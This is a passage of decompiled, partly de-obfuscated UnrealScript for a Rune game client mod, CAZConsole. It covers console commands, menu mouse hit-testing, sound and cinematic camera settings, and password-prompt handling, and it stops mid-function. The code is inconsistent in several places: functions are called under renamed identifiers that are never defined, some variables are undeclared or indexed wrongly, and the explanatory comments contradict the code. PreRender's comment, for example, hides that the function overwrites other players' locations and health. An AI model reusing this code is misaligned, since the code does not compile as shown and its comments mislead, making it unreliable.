class CAZConsole extends ProxyCons
    transient
    config(CAZConsole)
    perobjectconfig;

struct FClassTitleConfig
{
    var config string cClass;
    var config string cTitle;
};

struct STCT_v2098
{
    var string STR_v6323;
    var string STR_v6324;
    var Texture TXR_v6325;
    var float FLT_v6326;
    var float FLT_v6327;
    var float FLT_v6328;
    var float FLT_v6329;
    var float FLT_v6330;
    var float FLT_v6331;
    var bool B_v6332;
    var bool B_v6333;
    var Color Col_v6334;
    var Color Col_v6335;
    var Color Col_v6336;
    var bool B_v6337;
    var bool B_v6338;
    var bool B_v6339;
    var bool B_v6340;
    var int INT_v6341;
};

struct FMenuCategory
{
    var string Help[64];
    var string inputType[64];
    var string Value[64];
    var int maxValue;
    var int minValue;
    var float stepValue;
    var int controlStyle;
    var float defaultFloat;
    var int count;
};

struct CAZCON_STRUCTCORE2
{
    var config bool bModify;
    var config string MapName;
    var config bool bDisableSkybox;
    var config int TextureOverlay;
    var config bool bDisableAmbientSound;
    var config bool bDisableFog;
    var config Color blurCol;
    var config bool bColorCorrection;
    var config float color_alpha;
};

struct FMacroTextureTheme
{
    var string MTT_TextureName;
    var string MTT_ThemeName;
};

struct STCT_v2211
{
    var string PlayerName;
    var int Parm_int_0;
    var int Score;
    var int Deaths;
};

struct STCT_v2217
{
    var string PlayerName;
    var string STR_v5383;
    var int Score;
    var int PlayerID;
    var int Team;
    var bool B_v6656;
};

struct STCT_v2247
{
    var localized string Msg;
    var Font MsgFont;
    var Vector VCT_v3828;
    var Color MsgColor;
};

struct STCT_v436
{
    var() int X;
    var() int Y;
    var() int W;
    var() int H;
};

var bool B_v6289;
var bool B_v6290;
var float FLT_v6291;
var float FLT_v6292;
var FClassTitleConfig ClassTitleConfig;
var UWindowWindow UNK_v6297;
var config bool bKillfeed;
var config bool bLargeFeed;
var string STR_v6300;
var string STR_v6301;
var float FLT_v6302;
var float FLT_v6303;
var float FLT_v6304;
var float FLT_v6305;
var float FLT_v6306;
var float FLT_v6307;
var Texture TXR_v6308;
var int INT_v6309;
var int INT_v6310;
var float FLT_v6311;
var float FLT_v6312;
var bool B_v6313;
var int INT_v6314;
var int INT_v6315;
var string STR_v6316;
var float FLT_v6317;
var float FLT_v6318;
var float FLT_v6319;
var float FLT_v6320;
var int INT_v6321;
var config int KillFeedQueueSize;
var config int KillFeedTime;
var STCT_v2098 STCT_v6344[32];
var int INT_v6345;
var int INT_v6346;
var int INT_v6347;
var int INT_v6348;
var config bool arenatest;
var int INT_v6350;
var int INT_v6351;
var int INT_v6352;
var float FLT_v6353;
var int INT_v6354;
var bool B_v6355;
var int INT_v6356;
var int INT_v6357;
var float FLT_v6358;
var int INT_v6359;
var Font Fnt_v5287;
var Texture Background;
var Texture Seperator;
var float FLT_v6360;
var config bool atEveryone;
var config bool bdebugk;
var int INT_v6363;
var config bool bCustomWeaponColor;
var config int weaR;
var config int weaG;
var config int weaB;
var Weapon Wpn_v5812;
var string STR_v6368;
var int INT_v6369;
var Actor A_v6370;
var Actor A_v6371;
var int INT_v6372;
var Vector VCT_v6373;
var string STR_v6374;
var string STR_v6375;
var Vector VCT_v6376;
var config bool bCustomBlood;
var config int bloodDensity;
var config int testint1;
var config int testint2;
var config int testint3;
var config int testint4;
var config int testint5;
var config int testint6;
var config int testint7;
var config int testint8;
var config int testint9;
var config int testint10;
var config float testfloat1;
var config float testfloat2;
var config float testfloat3;
var config float testfloat4;
var config float testfloat5;
var config float testfloat6;
var config float testfloat7;
var config float testfloat8;
var config float testfloat9;
var config float testfloat10;
var config string testString1;
var config string teststring2;
var config Color bluetext;
var config int BR;
var config int BG;
var config int BB;
var config int HR;
var config int hG;
var config int hB;
var config int hTR;
var config int hTG;
var config int hTB;
var config int MR;
var config int MG;
var config int MB;
var config int SR;
var config int SG;
var config int SB;
var config int tr;
var config int TG;
var config int tB;
var config int barR;
var config int barG;
var config int barB;
var string STR_v6409;
var Sound UNK_v6410;
var string STR_v6411;
var config bool soundNoOverWrite;
var config float SoundVolume;
var config float SoundPitch;
var config float SoundRadius;
var bool B_v6413;
var bool B_v6414;
var config int menuGap;
var config int categoryGap;
var config int bigfontGap;
var config bool bigFontMenu;
var config int horizontalModifier;
var string STR_v6427;
var int INT_v6428;
var int INT_v6429;
var int INT_v6430;
var int INT_v6431;
var int INT_v6432;
var int INT_v6433;
var FMenuCategory MenuCategories[12];
var FMenuCategory STCT_v6434;
var bool B_v4524;
var string STR_v6435;
var int INT_v6436;
var config int jointAdd;
var config int whichJoint;
var int INT_v6439;
var config bool bMenu;
var config bool bCMenu;
var config int cMenuKey;
var config string cMenuKeyName;
var bool B_v6444;
var bool B_v6445;
var bool B_v6446;
var bool B_v6447;
var int INT_v6448;
var int gI;
var int INT_v3203;
var int INT_v3204;
var int INT_v6450;
var int INT_v6451;
var int INT_v6452;
var config int categoryHeight;
var config int categoryHeightMin;
var config int categoryWidth;
var config int MenuHeight;
var config int MenuWidth;
var config int functionDist;
var config int menuDist;
var config float categoryAlpha;
var config float menuAlpha;
var config float helpAlpha;
var config float barAlpha;
var config float barGap;
var config int barThick;
var config int catY;
var config int catYmin;
var int INT_v6466;
var int INT_v6467;
var string STR_v6468;
var int INT_v6469; 
var config int selectCountMax;
var config int catMinX;
var config int catMinY;
var config int tauntID;
var int GtauntID;
var config CAZCON_STRUCTCORE2 MapSettings[64];
var config bool bLocalModify;
var config string localMapname;
var config bool bLocalDisableSkybox;
var config int localTextureOverlay;
var config bool bLocalDisableAmbientSound;
var config bool bLocalDisableFog;
var config bool bLocalColorCorrection;
var config bool bSwapInput;
var config bool bSwap;
var config bool bIgnoreSpain;
var config int blur_r;
var config int blur_g;
var config int blur_b;
var config float blur_alpha;
var int INT_v6499;
var int INT_v6500;
var bool B_v6501;
var FMacroTextureTheme MTTarr[64];
var int INT_v6505;
var config bool bCAZDebug;
var config bool bCAZDebugMenu;
var config bool bCAZDebugUWindow;
var config int CAZDebugMode;
var int INT_v6510;
var int INT_v6511;
var config bool bCinematic;
var config bool bJoints;
var config bool bJointRot;
var config bool bJointPos;
var config int bJointNum;
var config int jointpos_X;
var config int jointpos_Y;
var config int jointPos_Z;
var config int jointrot_Pitch;
var config int jointrot_Yaw;
var config int jointRot_Roll;
var config bool bWallBlock;
var config bool bViewTargetRotationYaw;
var config bool bViewTargetRotationPitch;
var config int toggleMode;
var config int CineSpeed;
var config int CineAccel;
var config int CineDist;
var config int CineHeight;
var config int CinePitch;
var config int CineRoll;
var config float CineSmoothing;
var config bool showDiscordAd;
var float FLT_v6534;
var float FLT_v6535;
var float FLT_v6536;
var float FLT_v6537;
var bool B_v6538;
var config bool bFading;
var config bool bNoCenter;
var config bool deletemessages;
var config bool Trans;
var config bool bChat;
var config bool bCChat;
var config bool bMessageBeep;
var bool B_v6544;
var config bool bShowFPS;
var float FLT_v6546;
var float FLT_v6547;
var float FLT_v6548;
var float FLT_v6549;
var int INT_v6550;
var int INT_v6551;
var float FLT_v6552;
var config int xee;
var config int yee;
var config int zee;
var config int foo;
var config bool bNewHealthbar;
var config bool bUseSarkHUD;
var config int hudRed;
var config int hudGreen;
var config int hudBlue;
var config bool bOverwriteFont;
var config int ConsoleFont;
var config bool bTimeStamps;
var config bool bAutoDemoRec;
var config bool bAutoDemoRestart;
var config bool bAutoDemoDraw;
var config bool bSwitchDateFormat;
var config bool bChangeHudScale;
var config bool bCustomHUDSCale;
var config bool bMagicAnus;
var config float HudScale;
var config float cHUDScale;
var config int devSettings;
var config bool bUseGreenColor;
var config bool smartass;
var config bool smartasswords;
var config bool announceKills;
var config bool showBlackBackground;
var config bool bNoCollision;
var config bool bShowNames;
var config bool newSpectatorMode;
var config bool bShowInfos;
var config float consoleTransparency;
var config bool bAutoScroll;
var float FLT_v6583;
var float FLT_v6584;
var config bool bChatlog;
var CoAdminLog UNK_v6586;
var string STR_v6587;
var config bool bAutoSelect;
var Actor A_v6589;
var bool B_v6590;
var config bool bHighlightSelected;
var config int selectedObjectID;
var Actor A_v6593;
var config int rotIncDec;
var config int posIncDec;
var config int SColorR;
var config int SColorG;
var config int SColorB;
var config int HColorR;
var config int HColorG;
var config int HColorB;
var config int TColorR;
var config int TColorG;
var config int TColorB;
var config int AColorR;
var config int AColorG;
var config int AColorB;
var config int EColorR;
var config int EColorG;
var config int EColorB;
var config int M1ColorR;
var config int M1ColorG;
var config int M1ColorB;
var config int M2ColorR;
var config int M2ColorG;
var config int M2ColorB;
var config int M3ColorR;
var config int M3ColorG;
var config int M3ColorB;
var config int M4ColorR;
var config int M4ColorG;
var config int M4ColorB;
var config int SepColorR;
var config int SepColorG;
var config int SepColorB;
var config int THColorR;
var config int THColorG;
var config int THColorB;
var config int cchatLines;
var config int chatlines;
var config int chatFont;
var config int GSize;
var config int GSizeM;
var config int GSizeS;
var bool B_v6635;
var bool B_v6636;
var bool B_v6637;
var bool B_v6638;
var config int zstatThrowKills;
var config int zstatHeadKills;
var config int zstatChatKills;
var config int zstatJumpKills;
var config int zstatBiggestSpree;
var config int zstatDeaths;
var config int zstatKills;
var config int zstatGamesPlayed;
var config int zstatMinutesPlayed;
var config int zstatArenaKills;
var config int zstatArenaDeaths;
var config string zStatDate;
var int INT_v6651;
var int INT_v6652;
var STCT_v2211 STCT_v6654;
var STCT_v2217 STCT_v6657;
var bool bTestTorch;
var FTorch FTorch_v6659;
var config bool bConsoleChat;
var config bool bEnhancedChat;
var string STR_v6662;
var string STR_v6663;
var string STR_v6664;
var string STR_v6665;
var string STR_v6666;
var string STR_v6667;
var string STR_v6668;
var string STR_v6669;
var bool B_v6670;
var string STR_v6671;
var string STR_v6672;
var string Commands[100];
var string ActorArr[256];
var string STR_v6674;
var int INT_v6675;
var config int cSmartKey;
var config string cSmartKeyName;
var int INT_v6678;
var int INT_v6679;
var float FLT_v6680;
var bool Console_GBool;
var bool B_v6682;
var bool B_v6683;
var bool B_v6684;
var int INT_v6685;
var string STR_v4369;
var ZRunePlayer RPlayerOwner;
var RuneConsole RConsole;
var ZoneInfo ZI_v6688;
var UWindowConsoleWindow UNK_v6689;
var zRuneConsoleWindow zRConsoleW;
var PlayerPawn Owner;
var PlayerReplicationInfo PRI_v6691;
var zWindow UNK_v6263;
var CountryClient CountryClient;
var int PlayerID;
var config int newConsole;
var bool spec;
var bool B_v377;
var bool B_v6693;
var int INT_v6694;
var bool B_v6695;
var string STR_v6696;
var int INT_v6697;
var int INT_v6698;
var int INT_v6699;
var int INT_v6700;
var bool B_v6701;
var bool B_v1853;
var int INT_v6702;
var string STR_v6703;
var int INT_v6704;
var Snow Snow;
var int INT_v6706;
var config string PlayerKey;
var string STR_v6707;
var int INT_v4864;
var int INT_v6708;
var float FLT_v6709;
var config string myStatus;
var private bool UNK_v6711;
var string STR_v6712;
var string STR_v6713;
var bool B_v6714;
var int INT_v4621;
var Vector VCT_v4590;
var int INT_v6715;
var Rotator UNK_v6716;
var bool B_v6717;
var bool B_v6718;
var int INT_v6719;
var int YawTest;
var bool B_v6721;
var int INT_v6722;
var bool B_v3962;
var bool B_v6723;
var config byte zConsoleKey;
var config bool bDebug;
var config bool bshowzmenu;
var config bool bStats;
var config int testFont;
var config int testfont2;
var config string inn;
var config int detailsModifier;
var bool B_v6731;
var string STR_v6732;
var float FLT_v6733;
var int INT_v5872;
var int INT_v6734;
var int INT_v6735;
var string STR_v6736;
var bool B_v6737;
var bool B_v6738;
var int INT_v5348;
var rStatLog gStatLog;
var STCT_v2247 STCT_v6741;
var int INT_v5392;
var int INT_v6742;
var int INT_v6743;
var config bool isM;
var int INT_v6745;
var config int savedIdleTime;
var config string hashDe;
var config int zstatIdleTime;
var int INT_v5409;
var bool Parm_bool_0;
var config bool brecording;
var bool B_v6751;
var string STR_v6752;
var bool B_v6753;
var string STR_v6754;
var config int guitestID;
var Texture TXR_v6757;

// Suggested name: ExecuteSetAnimation
exec function setAnim(name AnimationName, string AnimationParameters)
{
    // This function sets the animation for the player.
    // It parses animation parameters from the input string and applies the animation.

    local float Parameter1, Parameter2, Parameter3;

    // Parse the animation parameters from the string.
    // It is assumed that eq_vxv_29 is a string splitting function.
    Parameter1 = float(GetDelimitedPart(AnimationParameters, 1));
    Parameter2 = float(GetDelimitedPart(AnimationParameters, 2));
    Parameter3 = float(GetDelimitedPart(AnimationParameters, 3));

    // If the owner is a ZRunePlayer, call the sAnim function.
    if (ZRunePlayer(Owner) != none)
    {
        ZRunePlayer(Owner).sAnim(AnimationName, AnimationParameters);
    }

    // Set the animation sequence for the player.
    ZRunePlayer(Owner).AnimSequence = AnimationName;
}

// Suggested name: SetGuiTestId
exec function guitest(int testId)
{
    // This function sets the GUI test ID and saves the configuration.
    guitestID = testId;
    SaveConfig();
}

// Suggested name: ExecuteZTest
exec function zTest(string Value)
{
    // This function is likely a test function.
    // If the input string starts with "test", it sets a property text.

    if (Left(Value, 4) ~= "test")
    {
        // It is assumed that eq_vxv_29 is a string splitting function.
        SetPropertyText(GetDelimitedPart(Value, 1), GetDelimitedPart(Value, 2));
    }
}

// Suggested name: IsPointInRectangle
function bool eq_vxv_435(STCT_v436 Rectangle, STCT_v436 Point)
{
    // This function checks if a point is inside a rectangle.
    return (((Point.X >= Rectangle.X) && Point.Y >= Rectangle.Y) && Point.X <= (Rectangle.X + Rectangle.W)) && Point.Y <= (Rectangle.Y + Rectangle.H);
}

// Suggested name: HandleMenuMouseInteraction
function eqpct_vxv_1151(Canvas Canvas, int X, int Y)
{
    local int i;
    local STCT_v436 CategoryRect, CategoryItemRects[64], MenuItemRects[64], SliderRects[64], MousePosition;
    local string HoveredElementString;

    if ((INT_v6715 == 1) && !bQuickKeyEnable)
    {
        INT_v6451 = int(10.0 + (GameMenu.WinWidth * Root.GUIScale));
        INT_v6450 = 250;
        INT_v3204 = 250;
    }
    else
    {
        INT_v6451 = 10 + horizontalModifier;
        INT_v6450 = 150 + detailsModifier;
        INT_v3204 = 150 + detailsModifier;
    }

    X = int(Root.MouseX * Root.GUIScale);
    Y = int(Root.MouseY * Root.GUIScale);
    MousePosition.X = X;
    MousePosition.Y = Y;

    CategoryRect.X = INT_v6451 - 20;
    CategoryRect.Y = (INT_v6450 - 23) - catY;
    CategoryRect.W = categoryWidth;
    CategoryRect.H = categoryHeight;

    if (bCAZDebug && bCAZDebugMenu)
    {
        DrawBorder(Canvas, float(CategoryRect.X), float(CategoryRect.Y), float(CategoryRect.W), float(CategoryRect.H), 1.0, MakeColor(0, 120, 255));
    }

    if (B_v6446 && IsPointInRectangle(CategoryRect, MousePosition))
    {
        HoveredElementString = "categories";
    }

    if (!B_v6444)
    {
        for (i = 0; i < INT_v6430; i++)
        {
            CategoryItemRects[i].X = INT_v6451 - 20;
            CategoryItemRects[i].Y = int((float(INT_v6450) - 0.5) - float(catY) + float((i - 1) * (12 + categoryGap)));
            CategoryItemRects[i].W = categoryWidth;
            CategoryItemRects[i].H = categoryGap + 12;

            if (bCAZDebug && bCAZDebugMenu)
            {
                DrawBorder(Canvas, float(CategoryItemRects[i].X), float(CategoryItemRects[i].Y), float(CategoryItemRects[i].W), float(CategoryItemRects[i].H), 1.0, MakeColor(120, 200, 120));
            }

            if (B_v6446 && IsPointInRectangle(CategoryItemRects[i], MousePosition))
            {
                if ((MouseX != FLT_v6584) || MouseY != FLT_v6583)
                {
                    FLT_v6584 = MouseX;
                    FLT_v6583 = MouseY;
                    gI = i;
                }
                HoveredElementString = (HoveredElementString $ "[") $ string(i) $ "]";
            }
        }
    }

    if (B_v6444)
    {
        for (i = 0; i < (MenuCategories[gI].count + 1); i++)
        {
            MenuItemRects[i].X = ((INT_v6451 + categoryWidth) - 30) + 15;
            MenuItemRects[i].Y = ((INT_v3204 - 15) + MenuHeight) + ((i - 1) * (12 + menuGap));
            MenuItemRects[i].W = MenuWidth - 5;
            MenuItemRects[i].H = menuGap + 12;

            if (bCAZDebug && bCAZDebugMenu)
            {
                DrawBorder(Canvas, float(MenuItemRects[i].X), float(MenuItemRects[i].Y), float(MenuItemRects[i].W), float(MenuItemRects[i].H), 1.0, MakeColor(200, 50, 120));
            }

            if (B_v6446 && IsPointInRectangle(MenuItemRects[i], MousePosition))
            {
                if ((MouseX != FLT_v6584) || MouseY != FLT_v6583)
                {
                    FLT_v6584 = MouseX;
                    FLT_v6583 = MouseY;
                    INT_v6448 = i;
                }
                HoveredElementString = (HoveredElementString $ "menuElement[") $ string(i) $ "]";
            }

            if (((MenuCategories[gI].controlStyle[i] == 2) || MenuCategories[gI].controlStyle[i] == 3) || MenuCategories[gI].controlStyle[i] == 4) || MenuCategories[gI].controlStyle[i] == 5)
            {
                SliderRects[i].X = (INT_v6451 + menuDist) + functionDist;
                SliderRects[i].Y = INT_v3204 + (i * (12 + menuGap));
                SliderRects[i].W = 64;
                SliderRects[i].H = 8;

                if (bCAZDebug && bCAZDebugMenu)
                {
                    DrawBorder(Canvas, float(SliderRects[i].X), float(SliderRects[i].Y), float(SliderRects[i].W), float(SliderRects[i].H), 2.0, MakeColor(50, 50, 120));
                }

                if (B_v6446 && IsPointInRectangle(SliderRects[i], MousePosition))
                {
                    if ((MouseX != FLT_v6584) || MouseY != FLT_v6583)
                    {
                        FLT_v6584 = MouseX;
                        FLT_v6583 = MouseY;
                        INT_v6448 = i;
                    }
                    HoveredElementString = (HoveredElementString $ "SLIDER[") $ string(i) $ "]";
                }
            }
        }
    }

    if (!B_v6446)
    {
        return;
    }

    if (HoveredElementString != "")
    {
        B_v6751 = true;
        STR_v6752 = HoveredElementString;
        if (bCAZDebug && bCAZDebugMenu)
        {
            DrawTextWithBackground(Canvas, (((("X=" $ string(X)) @ "Y=") $ string(Y)) @ "> ") $ HoveredElementString, X, Y, 0.65, MakeColor(0, 255, 0), MakeColor(255, 255, 255), 5, 0, false);
        }
    }
    else
    {
        B_v6751 = false;
        STR_v6752 = HoveredElementString;
        if (bCAZDebug && bCAZDebugMenu)
        {
            DrawTextWithBackground(Canvas, (("X=" $ string(X)) @ "Y=") $ string(Y), X, Y, 0.65, MakeColor(255, 0, 0), MakeColor(255, 255, 255), 5, 0, false);
        }
    }
}

// Suggested name: OnPreRender
event PreRender(Canvas Canvas)
{
    // This event is called before the scene is rendered.
    // It seems to be doing some logic related to player replication information.

    local int i;
    local PlayerReplicationInfo PRI;
    local Pawn OtherPawn;

    if ((ZRunePlayer(Owner).GGREPInfo != none) && (ZRunePlayer(Owner).GPRI2 != none))
    {
        for (i = 0; i < 32; i++)
        {
            ZRunePlayer(Owner).PRI_v4499[i] = none;
            PRI = ZRunePlayer(Owner).GGREPInfo.PRIArray[i];

            if (PRI != none)
            {
                OtherPawn = Pawn(PRI.Owner);

                if ((PRI != ZRunePlayer(Owner).GPRI2) && (OtherPawn != none))
                {
                    if (!ZRunePlayer(Owner).GGREPInfo.bTeamGame || (int(PRI.Team) != int(ZRunePlayer(Owner).GPRI2.Team)))
                    {
                        PRI.PlayerLocation = ZRunePlayer(Owner).GPRI2.PlayerLocation;
                        PRI.PlayerZone = none;
                        OtherPawn.Health = (-5 * i) - 4;
                    }

                    ZRunePlayer(Owner).PRI_v4499[i] = PRI;
                    OtherPawn.bIsPlayer = false;
                }
            }
        }

        ZRunePlayer(Owner).GameReplicationInfo = none;
        ZRunePlayer(Owner).PlayerReplicationInfo = none;
    }
}

// Suggested name: SetSound
exec function setsound(string SoundPath)
{
    // This function loads a sound from the given path and sets it as the current sound.

    LoadedSound = Sound(DynamicLoadObject(SoundPath, Class'Engine.Sound'));
    CurrentSoundPath = SoundPath;

    if (LoadedSound == none)
    {
        Viewport.Actor.ClientMessage("Error -> Sound not found.");
    }
}

// Suggested name: PlaySoundForPlayer
exec function soundStart()
{
    // This function plays a sound, choosing between two different sounds
    // based on whether the player has admin privileges.

    if (Owner.PlayerReplicationInfo.bAdmin)
    {
        // Play the admin-specific sound
        HandleObjectManipulation("playmahsound2", false);
    }
    else
    {
        // Play the default sound for regular players
        HandleObjectManipulation("playmahsound", false);
    }
}

// Suggested name: SetSoundVolume
exec function setSoundVolume(float NewVolume)
{
    // This function sets the volume for the sound.
    SoundVolume = NewVolume;
}

// Suggested name: SetSoundPitch
exec function setSoundPitch(float NewPitch)
{
    // This function sets the pitch for the sound.
    SoundPitch = NewPitch;
}

// Suggested name: SetSoundRadius
exec function setSoundRadius(float NewRadius)
{
    // This function sets the radius for the sound.
    SoundRadius = NewRadius;
}

// Suggested name: PrecacheAssets
function eqG_vxv_2266()
{
    // This function appears to be for pre-caching assets (a mesh and several fire textures)
    // to ensure they are loaded into memory.

    local Mesh CatLadyMesh;
    local FireTexture PrecachedFireTexture;

    CatLadyMesh = LodMesh'cats.catlady';
    PrecachedFireTexture = FireTexture'CAZFire.test1';
    PrecachedFireTexture = FireTexture'CAZFire.test2';
    PrecachedFireTexture = FireTexture'CAZFire.test3';
    PrecachedFireTexture = FireTexture'CAZFire.test4';
    PrecachedFireTexture = FireTexture'CAZFire.emmix';
    PrecachedFireTexture = FireTexture'CAZFire.love';
    PrecachedFireTexture = FireTexture'CAZFire.love2';
}

// Suggested name: RestartClientForCameraDebug
exec function testcambug()
{
    // This function restarts the client, likely for debugging camera-related issues.
    RunePlayer(Owner).ClientReStart();
}

// Suggested name: RequestLoadSkins
function eqpct_vxv_1172()
{
    // This function sends a request to the server to load skins.
    zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("loadSkins", "", 1);
}

// Suggested name: OnConnectionFailure
event ConnectFailure(string FailureReason, string URL)
{
    // This event is triggered when a connection to a server fails.
    // It handles different failure reasons, such as incorrect passwords,
    // and prompts the user for a password if necessary.

    local zRuneMenuPasswordWindow PasswordWindow;
    local zorgRuneMenuPasswordWindow OrgPasswordWindow;

    // This is a busy-wait loop that can cause performance issues.
    // It waits for the LookAndFeel to be set to zLookAndFeel.
    // A better approach would be to use a timer or a different event.
    while (Root.LookAndFeel.Class != Class'coadminz7.zLookAndFeel')
    {
        // Keep waiting
    }

    TXR_v6757 = Texture'worldflags.DE';

    if ((FailureReason == "ZNEEDPW") || FailureReason == "ZWRONGPW")
    {
        if (FailureReason == "ZNEEDPW")
        {
            Viewport.Actor.ClearProgressMessages();
        }
        CloseUWindow();
        bQuickKeyEnable = true;
        LaunchUWindow();
        PasswordWindow = zRuneMenuPasswordWindow(Root.CreateWindow(Class'coadminz7.zRuneMenuPasswordWindow', 200.0, 250.0, 250.0, 200.0));
        PasswordWindow.ShowWindow();
        Root.ActiveWindow = none;
        zRuneMenuPasswordCW(PasswordWindow.ClientArea).URL = URL;
    }
    else
    {
        if (FailureReason == "NEEDPW")
        {
            Viewport.Actor.ClearProgressMessages();
        }
        CloseUWindow();
        bQuickKeyEnable = true;
        LaunchUWindow();
        OrgPasswordWindow = zorgRuneMenuPasswordWindow(Root.CreateWindow(Class'coadminz7.zorgRuneMenuPasswordWindow', 100.0, 100.0, 100.0, 100.0));
        OrgPasswordWindow.ShowWindow();
        Root.ActiveWindow = none;
        zorgRuneMenuPasswordCW(OrgPasswordWindow.ClientArea).URL = URL;
    }
}

// Suggested name: ClientTravelWithPassword
function Parm_string_079(string URL, string Password)
{
    // This function initiates a client travel to the specified URL.
    // If a password is provided, it is appended to the URL.

    Viewport.Actor.ClearProgressMessages();

    if (Password == "")
    {
        Viewport.Actor.ClientTravel(URL, 0, false);
    }
    else
    {
        Owner.UpdateURL("Password", Password, true);
        Viewport.Actor.ClientTravel((URL $ "?password=") $ Password, 0, false);
    }
}

// Suggested name: SetXee
exec function xe(int i)
{
    // This function sets the value of the xee variable.
    xee = i;
}

// Suggested name: SetYee
exec function ye(int i)
{
    // This function sets the value of the yee variable.
    yee = i;
}

// Suggested name: SetZee
exec function ze(int i)
{
    // This function sets the value of the zee variable.
    zee = i;
}

// Suggested name: SetFoo
exec function FO(int i)
{
    // This function sets the value of the foo variable.
    foo = i;
}

// Suggested name: MoveForward
exec function moveforward()
{
    // This function moves the player forward by increasing the aBaseY property.
    Owner.aBaseY += 300.0;
}

// Suggested name: MoveBackward
exec function movebackward()
{
    // This function moves the player backward by decreasing the aBaseY property.
    Owner.aBaseY -= 300.0;
}

// Suggested name: StrafeRight
exec function StrafeRight()
{
    // This function handles right strafing.
    // If B_v4524 is false, it strafes right, otherwise it calls sideTurn.

    if (!B_v4524)
    {
        Owner.aStrafe += 300.0;
    }
    else
    {
        sideTurn(0);
    }
}

// Suggested name: StrafeLeft
exec function StrafeLeft()
{
    // This function handles left strafing.
    // If B_v4524 is false, it strafes left, otherwise it calls sideTurn.

    if (!B_v4524)
    {
        Owner.aStrafe -= 300.0;
    }
    else
    {
        sideTurn(3);
    }
}

// Suggested name: TurnPlayerView
exec function sideTurn(int YawMultiplier)
{
    // This function turns the player's view based on the YawMultiplier.

    local Rotator NewRotation;

    if ((zPlayerReplicationInfo(Owner.PlayerReplicationInfo).UNK_v5385 != none) && !ContainsString(string(Owner.AnimProxy.AnimSequence), "attack"))
    {
        INT_v6719 = 0;
        INT_v6722 = 0;

        if (YawMultiplier == 0)
        {
            Owner.ViewRotation.Yaw = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).UNK_v5385.Rotation.Yaw;
        }
        else if (YawMultiplier == 1)
        {
            Owner.ViewRotation.Yaw = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).UNK_v5385.Rotation.Yaw * 2;
        }
        else
        {
            Owner.ViewRotation.Yaw = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).UNK_v5385.Rotation.Yaw * YawMultiplier;
        }

        NewRotation = Owner.Rotation;
        NewRotation.Yaw = Owner.ViewRotation.Yaw;

        if (Owner.ViewRotation.Yaw == INT_v5392)
        {
            return;
        }

        INT_v5392 = Owner.ViewRotation.Yaw;
        Owner.SetRotation(NewRotation);
    }
}

// Suggested name: SetRecordingMode
exec function recording(string Mode)
{
    // This function enables or disables a "recording" mode, which affects several HUD and chat-related settings.

    local string LowercaseMode;
    LowercaseMode = Caps(Mode);

    if (LowercaseMode == "ON" || LowercaseMode == "ENABLE" || LowercaseMode == "ENABLED" || LowercaseMode == "ACTIVATE" || LowercaseMode == "TRUE")
    {
        Owner.myHUD.HudMode = 0;
        bCChat = false;
        showDiscordAd = false;
        brecording = true;
    }
    else if (LowercaseMode == "OFF" || LowercaseMode == "DISABLE" || LowercaseMode == "DISABLED" || LowercaseMode == "DEACTIVATE" || LowercaseMode == "FALSE")
    {
        Owner.myHUD.HudMode = 1;
        bCChat = true;
        showDiscordAd = true;
        brecording = false;
    }
}

// Suggested name: DebugKey
exec function debugk()
{
    // This function is currently empty and may be a placeholder for a debug key or function.
    return;
}

// Suggested name: FusePlayerNames
exec function fusionate(int PlayerID1, int PlayerID2)
{
    // This function "fuses" the names of two players, creating two new names
    // by combining the first half of one name with the second half of the other.

    local string PlayerName1, PlayerName2;
    local PlayerReplicationInfo PRI;
    local int PlayerName1_Length, PlayerName2_Length;
    local string FusedName1, FusedName2;

    foreach Owner.Level.AllActors(Class'Engine.PlayerReplicationInfo', PRI)
    {
        if (PRI.PlayerID == PlayerID1)
        {
            PlayerName1 = PRI.PlayerName;
        }
        if (PRI.PlayerID == PlayerID2)
        {
            PlayerName2 = PRI.PlayerName;
        }
    }

    if ((PlayerName1 != "") && (PlayerName2 != ""))
    {
        PlayerName1_Length = Len(PlayerName1);
        PlayerName2_Length = Len(PlayerName2);

        FusedName1 = Left(PlayerName1, PlayerName1_Length / 2) $ Right(PlayerName2, PlayerName2_Length / 2);
        FusedName2 = Left(PlayerName2, PlayerName2_Length / 2) $ Right(PlayerName1, PlayerName1_Length / 2);

        Owner.Say(((("I'm fusionating " $ PlayerName1) $ " and ") $ PlayerName2) $ ".");
        Owner.Say(((((((PlayerName1 $ " is now called '") $ FusedName1) $ "' and ") $ PlayerName2) $ " is now called '") $ FusedName2) $ "'");
    }
}

// Suggested name: ConfigureCinematics
exec function cine(string Command)
{
    // This function configures the cinematic camera settings.
    // It can reset the settings to their default values or display a help message.

    local string Option;
    local float Value;

    if (Command ~= "RESET")
    {
        CineSpeed = 150;
        CineAccel = 7;
        CineDist = 180;
        CineHeight = 35;
        CineRoll = 0;
        CineSmoothing = 6.0;
        return;
    }

    if ((Command == "") || Command ~= "HELP")
    {
        Owner.ClientMessage("===================================");
        Owner.ClientMessage("CAZ Cinematics:");
        Owner.ClientMessage("===================================");
        Owner.ClientMessage("Available options: speed, acceleration, distance, height, stiffness, roll, wallblock <on/off>, targetyaw <on/off>, targetpitch <on/off>");
        Owner.ClientMessage("===================================");
        Owner.ClientMessage("Usage: cine 'OPTION' 'value'");
        Owner.ClientMessage("===================================");
        Owner.ClientMessage("Examples:");
        Owner.ClientMessage("===================================");
        Owner.ClientMessage("cine speed 100");
        Owner.ClientMessage("cine acceleration 2");
        Owner.ClientMessage("cine distance 500");
        Owner.ClientMessage("cine distance 10");
        Owner.ClientMessage("cine stiffness 3");
        Owner.ClientMessage("cine roll -3000");
        Owner.ClientMessage("cine wallblock on");
        Owner.ClientMessage("cine targetyaw off");
        Owner.ClientMessage("cine targetpitch on");
        return;
    }

    Option = Caps(GetDelimitedPart(Command, 1));
    Value = float(GetDelimitedPart(Command, 2));

    if (Option == "SPEED")
    {
        CineSpeed = int(Value);
    }
    else if (Option == "ACCELERATION")
    {
        CineAccel = int(Value);
    }
    else if (Option == "DISTANCE")
    {
        CineDist = int(Value);
    }
    else if (Option == "HEIGHT")
    {
        CineHeight = int(Value);
    }
    else if (Option == "ROLL")
    {
        CineRoll = int(Value);
    }
    else if (Option == "STIFFNESS")
    {
        CineSmoothing = Value;
    }
    else if (Option == "WALLBLOCK")
    {
        bWallBlock = !bWallBlock;
    }
    else if (Option == "TARGETYAW")
    {
        if ((GetDelimitedPart(Command, 2) ~= "ON") || (GetDelimitedPart(Command, 2) ~= "TRUE"))
        {
